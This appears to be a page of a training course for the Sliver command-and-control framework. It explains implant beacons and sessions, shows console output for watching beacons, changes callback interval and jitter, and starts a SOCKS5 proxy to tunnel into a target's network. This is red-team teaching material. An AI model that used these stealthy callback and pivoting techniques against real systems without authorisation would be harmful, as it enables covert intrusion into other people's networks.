# This course is intended for the 1.6 version of Sliver, which is not yet published

Sliver implants support two types of connections, sessions and beacons.

Sessions use long-polling connections, which means they use a single TCP connection which is constantly open. Beacons on the other hand call back periodically, and will sleep when not active which can help keep their presence hidden.

Typically during an engagement you will want to deploy a beacon on the target system, and switch to a session while doing more active enumeration activities.

Let’s start with generating and deploying a beacon using `http`.

```asciinema
{"src": "/asciinema/beacon_generation.cast", "cols": "132", "rows": "14", "idleTimeLimit": 8}
```

You can see the beacon callback times either in the `info` command or using `beacons watch`.

```bash
[server] sliver > beacons watch

 ID         Name            Transport   Username          Operating System   Last Check-In   Next Check-In
========== =============== =========== ================= ================== =============== ===============
 942c647c   TIRED_GIRAFFE   http(s)     tester   darwin/amd64       52s             12s

```

Beacon callback times and jitter can be set either during generation or on the fly using the `reconfig` command.

The example below sets the callback time to 5s with a 1s jitter.

```bash
[server] sliver (TIRED_GIRAFFE) > reconfig -i 5s -j 1s

[*] Tasked beacon TIRED_GIRAFFE (b8aa6fd8)

[+] TIRED_GIRAFFE completed task b8aa6fd8

[*] Reconfigured beacon

[server] sliver (TIRED_GIRAFFE) > info

         Beacon ID: 942c647c-8409-4877-9fa2-b84a7f27ad45
              Name: TIRED_GIRAFFE
          Hostname: tester.local
              UUID: c6de1a44-016a-5fbe-b76a-da56af41316d
          Username: tester
               UID: 501
               GID: 20
               PID: 55879
                OS: darwin
           Version:
            Locale:
              Arch: amd64
         Active C2: https://127.0.0.1
    Remote Address: 127.0.0.1:51803
         Proxy URL:
          Interval: 1m0s
            Jitter: 30s
     First Contact: Wed Apr 19 01:14:21 CEST 2023 (10m30s ago)
      Last Checkin: Wed Apr 19 01:18:20 CEST 2023 (6m31s ago)
      Next Checkin: Wed Apr 19 01:19:46 CEST 2023 (5m5s ago)
```

Commands issued for beacons can be viewed using `tasks`, the task state will indicate whether the command has completed or not.  The results of previously run tasks can be viewed using `tasks fetch`.

```asciinema
{"src": "/asciinema/beacon_tasks.cast", "cols": "132", "rows": "14", "idleTimeLimit": 8}
```

Session can be spun up using the `interactive` command.

```asciinema
{"src": "/asciinema/beacon_interractive.cast", "cols": "132", "rows": "14", "idleTimeLimit": 8}
```

Because of the differences between sessions and beacons, certain commands like `upload` or `download` are slower on beacons due to the callback time. Others such as socks5 are not supported and only allowed for sessions. As a rule of thumb anything requiring higher network bandwidth should be run from a session.

Let’s switch to our newly created session and spin-up a `socks5` proxy.

```bash

[server] sliver (TIRED_GIRAFFE) > use

? Select a session or beacon: SESSION  131a60b9  TIRED_GIRAFFE  127.0.0.1:51969  tester.local  tester  darwin/amd64
[*] Active session TIRED_GIRAFFE (131a60b9-db4f-4913-9064-18a17a0f09ab)

[server] sliver (TIRED_GIRAFFE) > socks5 start

[*] Started SOCKS5 127.0.0.1 1081
⚠️  In-band SOCKS proxies can be a little unstable depending on protocol
```

You can then point your browser to port 1081 to tunnel traffic through the implant to your target’s local network.

Try out some of the previous commands and compare behaviour on beacons and sessions. Once you are done, you should remember to close your session using the `close` command.
